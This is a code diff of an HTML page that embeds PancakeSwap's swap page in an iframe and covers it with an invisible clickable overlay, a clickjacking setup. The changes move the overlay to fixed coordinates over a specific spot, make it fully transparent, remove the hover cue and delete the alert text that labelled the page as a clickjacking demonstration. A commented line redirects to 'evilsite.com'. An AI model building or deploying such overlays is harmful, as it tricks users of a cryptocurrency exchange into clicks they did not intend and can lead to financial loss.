@@ -27,24 +27,16 @@
             z-index: 1;
             opacity: 1; /* Fully visible */
         }
-        /* Specific clickable area - this is now invisible but still clickable */
+        /* Clickable area - placed at (839px, 529px) and made slightly bigger */
         .click-area {
             position: absolute;
-            top: 30%;
-            left: 30%;
-            width: 150px;
-            height: 50px;
-            background-color: rgba(255, 0, 0, 0.3); /* Light red background */
-            color: white;
-            text-align: center;
-            padding: 10px;
-            font-size: 16px;
+            top: 529px;
+            left: 839px;
+            width: 200px; /* Slightly bigger */
+            height: 100px; /* Slightly bigger */
+            background-color: rgba(255, 0, 0, 0); /* Fully transparent */
             cursor: pointer;
             z-index: 3;
-            opacity: 0; /* Still invisible but clickable */
-        }
-        .click-area:hover {
-            background-color: rgba(255, 0, 0, 0.5); /* Slightly more visible on hover */
         }
     </style>
 </head>
@@ -53,17 +45,14 @@
         <!-- Iframe containing PancakeSwap -->
         <iframe src="https://pancakeswap.finance/swap" frameborder="0"></iframe>
 
-        <!-- Invisible clickable area (red) -->
-        <div class="click-area" onclick="triggerAction()">
-            <!-- No visible text here as the area is invisible -->
-        </div>
+        <!-- Invisible clickable area -->
+        <div class="click-area" onclick="triggerAction()"></div>
     </div>
 
     <script>
-        // This function triggers a specific action based on the clicked area
         function triggerAction() {
-            alert('You clicked in the specified area! This could be part of a clickjacking attack.');
-            // Example action: you can also add a redirect or other actions here
+            alert('You clicked in the specified area!');
+            // Example action: redirecting or another interaction
             // window.location.href = 'https://evilsite.com';
         }
     </script>
